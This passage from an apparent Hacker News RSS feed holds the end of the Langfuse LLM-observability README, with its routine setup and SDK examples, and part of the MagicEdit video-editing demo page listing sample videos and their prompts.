<li>Segment execution traces by user feedback, to e.g. identify production issues</li>
</ul>
<h3 tabindex="-1" dir="auto">Analytics</h3>
<p dir="auto">Reporting on</p>
<ul dir="auto">
<li>Token usage by model</li>
<li>Volume of traces</li>
<li>Scores/evals</li>
</ul>
<p dir="auto">Broken down by</p>
<ul dir="auto">
<li>Users</li>
<li>Releases</li>
<li>Prompt/chain versions</li>
<li>Prompt/chain types</li>
<li>Time</li>
</ul>
<p dir="auto">→ Expect releases with more ways to analyze the data over the next weeks.</p>
<h2 tabindex="-1" dir="auto">Get started</h2>
<h3 tabindex="-1" dir="auto">Step 1: Run Server</h3>
<h4 tabindex="-1" dir="auto">Langfuse Cloud</h4>
<p dir="auto">Managed deployment by the Langfuse team, generous free-tier (hobby plan) available, no credit card required.</p>
<p dir="auto">Links: <a href="https://cloud.langfuse.com/" rel="nofollow">Create account</a>, <a href="https://cloud.langfuse.com/" rel="nofollow">learn more</a></p>
<h4 tabindex="-1" dir="auto">Localhost</h4>
<p dir="auto">Requirements: Docker, Node.js &gt;=18, npm</p>
<div dir="auto" data-snippet-clipboard-copy-content="# Clone repository
git clone git@github.com:langfuse/langfuse.git
cd langfuse

# Run server and database
docker compose up -d

# Apply db migrations
DATABASE_URL=postgresql://postgres:postgres@localhost:5432/postgres DIRECT_URL=postgresql://postgres:postgres@localhost:5432/postgres npx prisma migrate deploy"><pre><span><span>#</span> Clone repository</span>
git clone git@github.com:langfuse/langfuse.git
<span>cd</span> langfuse

<span><span>#</span> Run server and database</span>
docker compose up -d

<span><span>#</span> Apply db migrations</span>
DATABASE_URL=postgresql://postgres:postgres@localhost:5432/postgres DIRECT_URL=postgresql://postgres:postgres@localhost:5432/postgres npx prisma migrate deploy</pre></div>
<h4 tabindex="-1" dir="auto">Self-host (Docker)</h4>
<p dir="auto"><a href="https://langfuse.com/docs/deployment/self-host" rel="nofollow">→ Instructions</a></p>
<h3 tabindex="-1" dir="auto">Step 2: Data ingestion</h3>
<h4 tabindex="-1" dir="auto">Langchain applications</h4>
<p dir="auto">The Langfuse callback handler automatically instruments Langchain applications. Currently available for Python, JS/TS support is in progress (add +1 to issue <a href="https://github.com/langfuse/langfuse-js/issues/11" data-hovercard-type="issue" data-hovercard-url="/langfuse/langfuse-js/issues/11/hovercard">here</a>).</p>

<div dir="auto" data-snippet-clipboard-copy-content="# Initialize Langfuse handler
from langfuse.callback import CallbackHandler
handler = CallbackHandler(PUBLIC_KEY, SECRET_KEY)

# Setup Langchain
from langchain.chains import LLMChain
...
chain = LLMChain(llm=llm, prompt=prompt)

# Add Langfuse handler as callback
chain.run(input=&quot;<user_input&quot;, callbacks=[handler])"><pre><span># Initialize Langfuse handler</span>
<span>from</span> <span>langfuse</span>.<span>callback</span> <span>import</span> <span>CallbackHandler</span>
<span>handler</span> <span>=</span> <span>CallbackHandler</span>(<span>PUBLIC_KEY</span>, <span>SECRET_KEY</span>)

<span># Setup Langchain</span>
<span>from</span> <span>langchain</span>.<span>chains</span> <span>import</span> <span>LLMChain</span>
...
<span>chain</span> <span>=</span> <span>LLMChain</span>(<span>llm</span><span>=</span><span>llm</span>, <span>prompt</span><span>=</span><span>prompt</span>)

<span># Add Langfuse handler as callback</span>
<span>chain</span>.<span>run</span>(<span>input</span><span>=</span><span>"&lt;user_input"</span>, <span>callbacks</span><span>=</span>[<span>handler</span>])</pre></div>
<p dir="auto">→ More details: <a href="https://langfuse.com/docs/integrations/langchain" rel="nofollow">Langchain integration docs</a></p>
<h4 tabindex="-1" dir="auto">SDKs to manually instrument application</h4>
<p dir="auto">Fully async, typed SDKs to instrument any LLM application. Currently available for Python &amp; JS/TS.</p>
<p dir="auto">→ <a href="https://langfuse.com/docs/guides/sdk-integration" rel="nofollow">Guide</a> with an example of how the SDK can be used</p>
<table>
<thead>
<tr>
<th>Package</th>
<th>Description</th>
<th>Links</th>
</tr>
</thead>
<tbody>
<tr>
<td><a href="https://pypi.python.org/pypi/langfuse" rel="nofollow"><img src="https://camo.githubusercontent.com/35f545eed9704ceba9160fd407a46893f771ab0b358052aa92f7e20a335090f3/68747470733a2f2f696d672e736869656c64732e696f2f707970692f762f6c616e67667573652e7376673f7374796c653d666c61742d737175617265266c6162656c3d707970692b6c616e6766757365" alt="PyPI Version" data-canonical-src="https://img.shields.io/pypi/v/langfuse.svg?style=flat-square&amp;label=pypi+langfuse"></a></td>
<td>Python</td>
<td><a href="https://langfuse.com/docs/integrations/sdk/python" rel="nofollow">docs</a>, <a href="https://github.com/langfuse/langfuse-python">repo</a></td>
</tr>
<tr>
<td><a href="https://www.npmjs.com/package/langfuse" rel="nofollow"><img src="https://camo.githubusercontent.com/56f6fae5a3ffa4a875835020fb76b0dbcecc98d7c1c3135693f3ba9880e32934/68747470733a2f2f696d672e736869656c64732e696f2f6e706d2f762f6c616e67667573653f7374796c653d666c61742d737175617265266c6162656c3d6e706d2b6c616e6766757365" alt="npm Version" data-canonical-src="https://img.shields.io/npm/v/langfuse?style=flat-square&amp;label=npm+langfuse"></a></td>
<td>JS/TS: Node &gt;= 18, Edge runtimes</td>
<td><a href="https://langfuse.com/docs/integrations/sdk/typescript" rel="nofollow">docs</a>, <a href="https://github.com/langfuse/langfuse-js">repo</a></td>
</tr>
<tr>
<td><a href="https://www.npmjs.com/package/langfuse-node" rel="nofollow"><img src="https://camo.githubusercontent.com/e5eaf21f8683e99f9bbf82d59cb7e99dbb0847fdbf013b09857ec449e3f48617/68747470733a2f2f696d672e736869656c64732e696f2f6e706d2f762f6c616e67667573652d6e6f64653f7374796c653d666c61742d737175617265266c6162656c3d6e706d2b6c616e67667573652d6e6f6465" alt="npm package" data-canonical-src="https://img.shields.io/npm/v/langfuse-node?style=flat-square&amp;label=npm+langfuse-node"></a></td>
<td>JS/TS: Node &lt;18</td>
<td><a href="https://langfuse.com/docs/integrations/sdk/typescript" rel="nofollow">docs</a>, <a href="https://github.com/langfuse/langfuse-js">repo</a></td>
</tr>
</tbody>
</table>
<h3 tabindex="-1" dir="auto">Add scores/evaluations to traces (optional)</h3>
<p dir="auto">Quality/evaluation of traces is tracked via scores (<a href="https://langfuse.com/docs/scores" rel="nofollow">docs</a>). Scores are related to traces and optionally to observations. Scores can be added via:</p>
<ul dir="auto">
<li>
<p dir="auto"><strong>Backend SDKs</strong> (see docs above): <code>{trace, event, span, generation}.score()</code></p>
</li>
<li>
<p dir="auto"><strong>API</strong> (see docs below): <code>POST /api/public/scores</code></p>
</li>
<li>
<p dir="auto"><strong>Client-side using Web SDK</strong>, e.g. to capture user feedback or other user-based quality metrics:</p>

<div dir="auto" data-snippet-clipboard-copy-content="// Client-side (browser)

import { LangfuseWeb } from &quot;langfuse&quot;;

const langfuseWeb = new LangfuseWeb({
  publicKey: process.env.LANGFUSE_PUBLIC_KEY,
});

// frontend handler (example: React)
export function UserFeedbackComponent(props: { traceId: string }) {
  const handleUserFeedback = async (value: number) => {
    await langfuseWeb.score({
      traceId: props.traceId,
      name: &quot;user_feedback&quot;,
      value,
    });
  };
  return (
    <div>
      <button onClick={() => handleUserFeedback(1)}>👍</button>
      <button onClick={() => handleUserFeedback(-1)}>👎</button>
    </div>
  );
}"><pre><span>// Client-side (browser)</span>

<span>import</span> <span>{</span> <span>LangfuseWeb</span> <span>}</span> <span>from</span> <span>"langfuse"</span><span>;</span>

<span>const</span> <span>langfuseWeb</span> <span>=</span> <span>new</span> <span>LangfuseWeb</span><span>(</span><span>{</span>
  <span>publicKey</span>: <span>process</span><span>.</span><span>env</span><span>.</span><span>LANGFUSE_PUBLIC_KEY</span><span>,</span>
<span>}</span><span>)</span><span>;</span>

<span>// frontend handler (example: React)</span>
<span>export</span> <span>function</span> <span>UserFeedbackComponent</span><span>(</span><span>props</span>: <span>{</span> <span>traceId</span>: <span>string</span> <span>}</span><span>)</span> <span>{</span>
  <span>const</span> <span>handleUserFeedback</span> <span>=</span> <span>async</span> <span>(</span><span>value</span>: <span>number</span><span>)</span> <span>=&gt;</span> <span>{</span>
    <span>await</span> <span>langfuseWeb</span><span>.</span><span>score</span><span>(</span><span>{</span>
      <span>traceId</span>: <span>props</span><span>.</span><span>traceId</span><span>,</span>
      <span>name</span>: <span>"user_feedback"</span><span>,</span>
      value<span>,</span>
    <span>}</span><span>)</span><span>;</span>
  <span>}</span><span>;</span>
  <span>return</span> <span>(</span>
    <span>&lt;</span><span>div</span><span>&gt;</span>
      <span>&lt;</span><span>button</span> <span>onClick</span><span>=</span><span>{</span><span>(</span><span>)</span> <span>=&gt;</span> <span>handleUserFeedback</span><span>(</span><span>1</span><span>)</span><span>}</span><span>&gt;</span><span>👍</span><span>&lt;</span><span><span>/</span>button&gt;</span><span></span>
      <span>&lt;</span><span>button</span> <span>onClick</span><span>=</span><span>{</span><span>(</span><span>)</span> <span>=&gt;</span> <span>handleUserFeedback</span><span>(</span><span>-</span><span>1</span><span>)</span><span>}</span><span>&gt;</span><span>👎</span><span>&lt;</span><span><span>/</span>button&gt;</span>
<span>    <span>&lt;</span><span>/</span>div</span><span>&gt;</span><span></span>
  <span>)</span><span>;</span>
<span>}</span></pre></div>
</li>
</ul>
<h4 tabindex="-1" dir="auto">API</h4>
<p dir="auto"><a href="https://langfuse.com/docs/integrations/api" rel="nofollow"><strong>Api reference</strong></a></p>
<ul dir="auto">
<li>POST/PATCH routes to ingest data</li>
<li>GET routes to use data in downstream applications (e.g. embedded analytics)</li>
</ul>
<h2 tabindex="-1" dir="auto">Questions / Feedback</h2>
<p dir="auto">The maintainers are very active in the Langfuse <a href="https://langfuse.com/discord" rel="nofollow">Discord</a> and are happy to answer questions or discuss feedback/ideas regarding the future of the project.</p>
<h2 tabindex="-1" dir="auto">Contributing to Langfuse</h2>
<p dir="auto">Join the community <a href="https://discord.gg/7NXusRtqYU" rel="nofollow">on Discord</a>.</p>
<p dir="auto">To contribute, send us a PR, raise a github issue, or email at <a href="mailto:contributing@langfuse.com">contributing@langfuse.com</a></p>
<h3 tabindex="-1" dir="auto">Development setup</h3>
<p dir="auto">Requirements: Node.js &gt;=18, npm, Docker</p>
<div dir="auto" data-snippet-clipboard-copy-content="# Install dependencies
npm install

# Run the db
docker-compose -f docker-compose.dev.yml up -d

# create an env file
cp .env.dev.example .env

# Migration
npm run db:migrate

# Optional: seed the database
# npm run db:seed
# npm run db:seed:examples

# Start the server
npm run dev"><pre><span><span>#</span> Install dependencies</span>
npm install

<span><span>#</span> Run the db</span>
docker-compose -f docker-compose.dev.yml up -d

<span><span>#</span> create an env file</span>
cp .env.dev.example .env

<span><span>#</span> Migration</span>
npm run db:migrate

<span><span>#</span> Optional: seed the database</span>
<span><span>#</span> npm run db:seed</span>
<span><span>#</span> npm run db:seed:examples</span>

<span><span>#</span> Start the server</span>
npm run dev</pre></div>
<h2 tabindex="-1" dir="auto">License</h2>
<p dir="auto">Langfuse is MIT licensed, except for <code>ee/</code> folder. See <a href="https://github.com/langfuse/langfuse/blob/main/LICENSE">LICENSE</a> and <a href="https://langfuse.com/docs/open-source" rel="nofollow">docs</a> for more details.</p>
<h2 tabindex="-1" dir="auto">Misc</h2>
<h3 tabindex="-1" dir="auto">Upgrade Langfuse (localhost)</h3>
<div dir="auto" data-snippet-clipboard-copy-content="# Stop server and db
docker compose down

# Pull latest changes
git pull
docker-compose pull

# Run server and db
docker compose up -d

# Apply db migrations
DATABASE_URL=postgresql://postgres:postgres@localhost:5432/postgres DIRECT_URL=postgresql://postgres:postgres@localhost:5432/postgres npx prisma migrate deploy"><pre><span><span>#</span> Stop server and db</span>
docker compose down

<span><span>#</span> Pull latest changes</span>
git pull
docker-compose pull

<span><span>#</span> Run server and db</span>
docker compose up -d

<span><span>#</span> Apply db migrations</span>
DATABASE_URL=postgresql://postgres:postgres@localhost:5432/postgres DIRECT_URL=postgresql://postgres:postgres@localhost:5432/postgres npx prisma migrate deploy</pre></div>
<h3 tabindex="-1" dir="auto">Run Langfuse in CI for integration tests</h3>
<p dir="auto">Checkout GitHub Actions workflows of <a href="https://github.com/langfuse/langfuse-python/blob/main/.github/workflows/ci.yml">Python SDK</a> and <a href="https://github.com/langfuse/langfuse-js/blob/main/.github/workflows/ci.yml">JS/TS SDK</a>.</p>
</article>
          </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[MagicEdit: High-Fidelity Temporally Coherent Video Editing (235 pts)]]></title>
            <link>https://magic-edit.github.io/</link>
            <guid>37309818</guid>
            <pubDate>Tue, 29 Aug 2023 15:57:58 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://magic-edit.github.io/">https://magic-edit.github.io/</a>, See on <a href="https://news.ycombinator.com/item?id=37309818">Hacker News</a></p>
<div id="readability-page-1" class="page">



<div>
        <h2>
          MagicEdit:
        </h2>
        <h3>
          High-Fidelity Temporally Coherent Video Editing
        </h3>
        

        <p><span>ByteDance Inc.</span>
          <span>&nbsp;&nbsp;<sup>*</sup>Equal Contribution</span>
        </p>

        
    </div>

<div>
        

      <p>
      <h2>
        <b>MagicEdit</b> explicitly disentangles the learning of appearance and motion to achieve high-fidelity and temporally coherent video editing.  
        It supports various editing applications, including video stylization, local editing, video-MagicMix and video outpainting. 
      </h2>
    </p>
  </div>

<div>
    <h2>Video stylization</h2>
    <p>
      Video stylization enables one to (1) transform the source video into a new video with a style-of-
      interest (e.g., realistic, cartoon), or (2) creating a new scene with different subject (e.g., dog → cat) 
      and different background (e.g., living room → beach).
    </p>

    <hr>
    <center>
      <h2><b>▶ </b> Animals</h2>
    </center>
    <hr>

    <table>
      <tbody><tr>
        <td>
          
        </td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/global/animals/sample_2_edit.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/global/animals/sample_3_edit.mp4"></video></td>
      </tr>
    </tbody></table>
    <center>
      <table>
        <tbody><tr>
          <td>Source video</td>
          <td></td>
          <td>"a monkey, playing on the coast, sea"</td>
          <td></td>
          <td>"a teddy bear, eating apple, green grassland with flowers"</td>
        </tr>
      </tbody></table>
    </center>

    <table>
      <tbody><tr>
        <td>
          
        </td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/global/animals/sample_8_edit.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/global/animals/sample_9_edit.mp4"></video></td>
      </tr>
    </tbody></table>
    <center>
      <table>
        <tbody><tr>
          <td>Source video</td>
          <td></td>
          <td>"a cute cat, sitting on the ground"</td>
          <td></td>
          <td>"a labrador dog, sitting on the table"</td>          
        </tr>
      </tbody></table>
    </center>

    <table>
      <tbody><tr>
        <td>
          
        </td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/global/animals/sample_0_edit.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/global/animals/sample_1_edit.mp4"></video></td>
      </tr>
    </tbody></table>
    <center>
      <table>
        <tbody><tr>
          <td>Source video</td>
          <td></td>
          <td>"a husky dog, lying on the sands"</td>
          <td></td>
          <td>"a sea lion, lying on the ice, winter, snow"</td>
        </tr>
      </tbody></table>
    </center>

    <hr>
    <center>
      <h2><b>▶ </b> Objects</h2>
    </center>
    <hr>

    <table>
      <tbody><tr>
        <td>
          
        </td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/global/objects/sample_2_edit.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/global/objects/sample_1_edit.mp4"></video></td>
      </tr>
    </tbody></table>
    <center>
      <table>
        <tbody><tr>
          <td>Source video</td>
          <td></td>
          <td>"a red car, moving on the road, autumn, maple leaves"</td>
          <td></td>
          <td>"a red car, moving on the road, mountain, green grass and trees"</td>          
        </tr>
      </tbody></table>
    </center>

    <table>
      <tbody><tr>
        <td>
          
        </td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/global/objects/sample_5_edit.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/global/objects/sample_6_edit.mp4"></video></td>
      </tr>
    </tbody></table>
    <center>
      <table>
        <tbody><tr>
          <td>Source video</td>
          <td></td>
          <td>"black and white biscuits, falling down sequentially"</td>
          <td></td>
          <td>"bricks, falling down sequentially"</td>
        </tr>
      </tbody></table>
    </center>
      
    <table>
      <tbody><tr>
        <td>
          
        </td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/global/objects/sample_7_edit.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/global/objects/sample_8_edit.mp4"></video></td>
      </tr>
    </tbody></table>
    <center>
      <table>
        <tbody><tr>
          <td>Source video</td>
          <td></td>
          <td>"stools, moving on the railway track"</td>
          <td></td>
          <td>"white cupcakes, moving on the table"</td>
        </tr>
      </tbody></table>
    </center>

    <hr>
    <center>
      <h2><b>▶ </b> Scenes</h2>
      <!-- <p>
        xxx
      </p> -->
    </center>
    <hr>

    <table>
      <tbody><tr>
        <td>
          
        </td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/global/scenes/sample_0_edit.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/global/scenes/sample_1_edit.mp4"></video></td>
      </tr>
    </tbody></table>
    <center>
      <table>
        <tbody><tr>
          <td>Source video</td>
          <td></td>
          <td>"boats and buildings, floating in the space, stars"</td>
          <td></td>
          <td>"boats, floating on the sea, villas on the coastal"</td>
        </tr>
      </tbody></table>
    </center>

    <table>
      <tbody><tr>
        <td>
          
        </td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/global/scenes/sample_2_edit.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/global/scenes/sample_3_edit.mp4"></video></td>
      </tr>
    </tbody></table>
    <center>
      <table>
        <tbody><tr>
          <td>Source video</td>
          <td></td>
          <td>"a submarine travelling in the sea, fish swimming"</td>
          <td></td>
          <td>"motorbike travelling in the tunnel, with graffiti on the wall"</td>
        </tr>
      </tbody></table>
    </center>

    <table>
      <tbody><tr>
        <td>
          
        </td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/global/scenes/sample_6_edit.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/global/scenes/sample_7_edit.mp4"></video></td>
      </tr>
    </tbody></table>
    <center>
      <table>
        <tbody><tr>
          <td>Source video</td>
          <td></td>
          <td>"red train travelling, snow, winter"</td>
          <td></td>
          <td>"train travelling, japanese, Cherry blossoms"</td>
        </tr>
      </tbody></table>
    </center>

    <hr>
    <center>
      <h2><b>▶ </b> Human</h2>
      <!-- <p>
        xxx
      </p> -->
    </center>
    <hr>

    <table>
      <tbody><tr>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/global/humans/sample_1_src.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/global/humans/sample_1_edit.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/global/humans/sample_2_src.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/global/humans/sample_2_edit.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/global/humans/sample_3_src.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/global/humans/sample_3_edit.mp4"></video></td>
      </tr>
    </tbody></table>
    <center>
      <table>
        <tbody><tr>
          <td>Source video</td>
          <td></td>
          <td>"a pretty girl, pink dress, living room"</td>
          <td></td>
          <td>Source video</td>
          <td></td>
          <td>"a pretty girl, white dress, dark hair, flowers"</td>
          <td></td>
          <td>Source video</td>
          <td></td>
          <td>"a pretty girl, white singlet, dark pants, on the stage"</td>
        </tr>
      </tbody></table>
    </center>

    <table>
      <tbody><tr>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/global/humans/sample_5_src.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/global/humans/sample_5_edit.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/global/humans/sample_6_src.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/global/humans/sample_6_edit.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/global/humans/sample_4_src.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/global/humans/sample_4_edit.mp4"></video></td>
      </tr>
    </tbody></table>
    <center>
      <table>
        <tbody><tr>
          <td>Source video</td>
          <td></td>
          <td>"a pretty girl, yellow dress, beach, coconut trees"</td>
          <td></td>
          <td>Source video</td>
          <td></td>
          <td>"a pretty girl, red dress, ballroom"</td>
          <td></td>
          <td>Source video</td>
          <td></td>
          <td>"a pretty girl, white dress, dark hair"</td>
        </tr>
      </tbody></table>
    </center>

  <hr>
  <div>
    <h2>Local editing</h2>
    <p>
      MagicEdit also allows users to make local modification to the video while leaving other regions untouched 
      (e.g., make the young lady wear glasses).
    </p>
    <hr>

    <table>
      <tbody><tr>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/local/sample_1_src.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/local/sample_1_edit.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/local/sample_2_src.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/local/sample_2_edit.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/local/sample_3_src.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/local/sample_3_edit.mp4"></video></td>
      </tr>
    </tbody></table>
    <center>
      <table>
        <tbody><tr>
          <td>Source video</td>
          <td></td>
          <td>"a handsome man"</td>
          <td></td>
          <td>Source video</td>
          <td></td>
          <td>"wearing sunglasses"</td>
          <td></td>
          <td>Source video</td>
          <td></td>
          <td>"a handsome man"</td>
        </tr>
      </tbody></table>
    </center>

    <table>
      <tbody><tr>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/local/sample_5_src.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/local/sample_5_edit.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/local/sample_6_src.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/local/sample_6_edit.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/local/sample_7_src.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/local/sample_7_edit.mp4"></video></td>
      </tr>
    </tbody></table>
    <center>
      <table>
        <tbody><tr>
          <td>Source video</td>
          <td></td>
          <td>"a senior lady"</td>
          <td></td>
          <td>Source video</td>
          <td></td>
          <td>"a young lady"</td>
          <td></td>
          <td>Source video</td>
          <td></td>
          <td>"a pretty girl"</td>
        </tr>
      </tbody></table>
    </center>

  </div>
  <hr>
  <div>
    <h2>Video-MagicMix</h2>
      <p>
        Similar to <a href="https://magicmix.github.io/">MagicMix</a>, we can also mix two different concepts (e.g., rabbit and tiger) in the video domain to create a novel concept (e.g., a rabbit-alike tiger).
      </p>
    <hr>
    <table>
      <tbody><tr>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/magicmix/sample_1_src.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/magicmix/sample_1_edit.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/magicmix/sample_2_edit.mp4"></video></td>
      </tr>
    </tbody></table>
    <center>
      <table>
        <tbody><tr>
          <td>Source video</td>
          <td></td>
          <td>"+ tiger"</td>
          <td></td>
          <td>"+ piglet"</td>
        </tr>
      </tbody></table>
    </center>
    <table>
      <tbody><tr>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/magicmix/sample_3_src.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/magicmix/sample_3_edit.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/magicmix/sample_4_edit.mp4"></video></td>
      </tr>
    </tbody></table>
    <center>
      <table>
        <tbody><tr>
          <td>Source video</td>
          <td></td>
          <td>"+ tiger"</td>
          <td></td>
          <td>"+ cat"</td>
        </tr>
      </tbody></table>
    </center>
  </div>

  <hr>
  <div>
    <h2>Video Outpainting</h2>
      <p>
        MagicEdit also supports video outpainting task without any re-training.
      </p>
    <hr>
    
    <center>
      <table>
        <tbody><tr>
          <td>Source video</td>
          <td></td>
          <td>Outpainted</td>
          <td></td>
          <td>Source video</td>
          <td></td>
          <td>Outpainted</td>
          <td></td>
          <td>Source video</td>
          <td></td>
          <td>Outpainted</td>
        </tr>
      </tbody></table>
    </center>
    <table>
      <tbody><tr>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/outpaint/sample_2_src.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/outpaint/sample_2_edit.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/outpaint/sample_5_src.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/outpaint/sample_5_edit.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/outpaint/sample_6_src.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/outpaint/sample_6_edit.mp4"></video></td>
      </tr>
    </tbody></table>
    <center>
      <table>
        <tbody><tr>
          <td>"a handsome man, jogging, on the road, sunny"</td>
          <td></td>
          <td>"a cute dog, garden, flowers"</td>
          <td></td>
          <td>"a pretty girl, sunset"</td>
        </tr>
      </tbody></table>
    </center>

    <table>
      <tbody><tr>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/outpaint/sample_7_src.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/outpaint/sample_7_edit.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/outpaint/sample_9_src.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/outpaint/sample_9_edit.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/outpaint/sample_10_src.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/outpaint/sample_10_edit.mp4"></video></td>
      </tr>
    </tbody></table>
    <center>
      <table>
        <tbody><tr>
          <td>"a pretty girl, grey t-shirt"</td>
          <td></td>
          <td>"an eagle, sea"</td>
          <td></td>
          <td>"a brown bear, forest"</td>
        </tr>
      </tbody></table>
    </center>

    <hr>
    <center>
      <h2><b></b> Video outpainting with different ratios and prompts</h2>
      <!-- <p>
        xxx
      </p> -->
    </center>
    <hr>

    <table>
      <tbody><tr>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/outpaint/sample_8_src.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/outpaint/sample_8_edit.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/outpaint/sample_4_src.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/outpaint/sample_4_edit.mp4"></video></td>
      </tr>
    </tbody></table>


    <table>
      <tbody><tr>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/outpaint/sample_1_src.mp4"></video></td>
        <td></td>
        <td><video muted="" autoplay="autoplay" loop="loop" src="https://magic-edit.github.io/assets/outpaint/sample_1_edit.mp4"></video></td>
        <td></td>
